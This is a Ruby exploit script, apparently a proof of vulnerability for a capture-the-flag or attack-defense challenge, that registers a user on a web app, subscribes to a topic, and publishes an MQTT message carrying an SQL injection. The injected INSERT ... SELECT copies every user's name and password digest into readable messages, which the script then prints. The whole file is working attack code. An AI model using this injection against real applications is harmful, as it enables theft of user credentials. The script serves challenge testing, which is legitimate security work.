#!/bin/env ruby

require "logger"

require 'securerandom'

require "mqtt"
require "mechanize"

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

MAX_PIN =  0xffffffffffffffff

class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = ENV['PORT'] || '3035'

    @mqtt = MQTT::Client.new(ENV['MQTT_URL'] || 'mqtt://mosquitto:1883')
    @mqtt.connect
  end

  def run!
    @slug = "pov_message_sqli #{rand 1_000_000} #{Time.now.to_i}"

    Mechanize.start do |agent|
      agent.follow_redirect = true

      index = agent.get "http://#{@host}:#{@port}"
      signup_form = index.form_with id: 'new_user_form'
      signup_form['user[name]'] = @slug
      signup_form['user[password]'] = @slug
      signup_form['user[password_confirmation]'] = @slug

      after_create = signup_form.submit

      assert_equal('created user, please log in',
                   after_create.search('dd.info').text)

      login_form = after_create.form_with id: 'new_session_form'
      login_form['username'] = @slug
      login_form['password'] = @slug
      
      after_login = login_form.submit
      subscription_form = after_login.form_with action: '/subscriptions'
      subscription_form['subscription[topic][name]'] = @slug

      did_subscribe = subscription_form.submit
      sub_href = did_subscribe.
        search("td.subscription_topic_name:contains(\"#{@slug}\")").
        first.
        parent.
        search('td.actions a').
        first.
        attr('href')

      sql = <<-SQL
      INSERT INTO messages (topic_id, content)
SELECT (SELECT id FROM topics WHERE name = '#{@slug}'),
name || ' -=- ' || password_digest FROM users;
      SQL

      prefix = "asdf');"
      suffix = '--'

      the_content_you_crave = prefix + sql + suffix
      LLL.info the_content_you_crave

      @mqtt.publish @slug, the_content_you_crave

      view_sub = did_subscribe.link_with(href: sub_href).click
      sub_messages = view_sub.search('table#messages tr')
      seen_messages = 0

      heredoc = SecureRandom.uuid
      puts "PRIVDATA_HERE=#{heredoc}"

      sub_messages.each do |tr|
        puts tr.search('td.message_content').text
        seen_messages += 1
      end
      puts heredoc

      if 2 >= seen_messages
        LLL.info "only got #{seen_messages}, probably failed"
        exit 1
      end
    end
  end

  private

  def assert_equal(expected, actual)
    assert(expected == actual, "expected #{expected} to == #{actual}")
  end

  def assert(predicate, message='failed assertion')
    return if predicate
    fail message
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
end
pov.run!

LLL.info "success :)"
